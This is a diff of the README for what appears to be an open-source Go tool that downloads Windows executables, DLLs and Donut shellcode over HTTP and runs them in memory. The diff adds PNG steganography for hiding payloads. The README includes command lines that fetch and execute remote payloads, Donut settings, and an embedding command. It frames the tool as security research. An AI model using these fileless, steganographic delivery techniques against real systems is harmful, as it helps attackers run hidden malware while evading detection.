@@ -1,7 +1,7 @@
 # pure go http memexec
 [![Go CI](https://github.com/carved4/pure-go-http-memexec/actions/workflows/go.yml/badge.svg)](https://github.com/carved4/pure-go-http-memexec/actions/workflows/go.yml)
 
-A lightweight, memory-safe Windows PE file execution tool that downloads and executes payloads without ever touching the disk. Supports both executables and DLLs.
+A lightweight, memory-safe Windows PE file execution tool that downloads and executes payloads without ever touching the disk. Supports executables, DLLs, shellcode (Donut format), and PE files embedded in PNG images.
 
 
 ## Features
@@ -11,6 +11,8 @@ A lightweight, memory-safe Windows PE file execution tool that downloads and exe
 - **Memory-Safe Execution**: Implements proper memory protection and relocation
 - **TLS Callback Support**: Properly handles TLS callbacks in PE files
 - **DLL Support**: Can load DLLs in memory and call exported functions
+- **Shellcode Support**: Execute Donut-generated shellcode directly in memory
+- **Steganography Support**: Extract and execute PE files embedded in PNG images
 - **Simple API**: Single command to download and execute payloads
 
 [find binject debug here](https://github.com/Binject/debug)
@@ -46,9 +48,11 @@ For PNGs: Extracts the embedded donut shellcode from the PNG and runs it as a th
 # Load a DLL and call an exported function by ordinal
 ./go-http-memexec -dll -ordinal=5 https://example.com/payload.dll
 
-# Load a PNG and extract + run rhe embedded shellcode
-./go-http-memexec -image -shellcode https://example.com/payload.PNG
+# Execute shellcode (Donut format only)
+./go-http-memexec -shellcode https://example.com/shellcode.bin
 
+# Extract and execute PE from PNG image
+./go-http-memexec -image https://example.com/payload.png
 ```
 
 ## Use Cases
@@ -58,6 +62,8 @@ For PNGs: Extracts the embedded donut shellcode from the PNG and runs it as a th
 - Advanced Windows process manipulation research
 - Fileless payload execution
 - Loading DLLs without registering them in the PEB loader list
+- Steganographic payload delivery
+- Shellcode execution from memory
 
 
 ## Build Instructions
@@ -113,6 +119,31 @@ This tool is designed for legitimate security research, testing, and educational
 - This project has only been tested on Windows 10
 - This is a rewrite of the original C++-based implementation, now in 100% pure Go
 - The DLL loading functionality allows more flexible in-memory execution without process hollowing
+
+## Shellcode Support
+
+The `-shellcode` flag enables execution of shellcode directly in memory. **Important notes**:
+
+- **Only Donut-generated shellcode is supported**
+- Recommended Donut parameters: `-x 3` and `-e 3`
+- The shellcode is executed in a new thread within the current process
+- The main process will wait for user input before exiting, allowing the shellcode to run
+
+## PNG Embedding
+
+The `-image` flag enables extraction and execution of PE files embedded in PNG images:
+
+- PE files are embedded using the included `embedPEpng` tool
+- The embedding uses LSB (Least Significant Bit) steganography
+- The tool automatically detects and extracts the PE file from the PNG
+- After extraction, the PE is executed according to its type (EXE or DLL)
+
+### Using the embedPEpng Tool
+
+```bash
+# Embed a PE file into a PNG image
+./embedPEpng -i source.png -pe payload.exe -o output.png
+```
 
 ## Demo Usage of tests (payloads pulled down in this example write a benign indicator of success as a .txt to a temp dir)
 https://github.com/user-attachments/assets/fbf58f99-fc74-41af-a96a-5ea01bc0c2aa
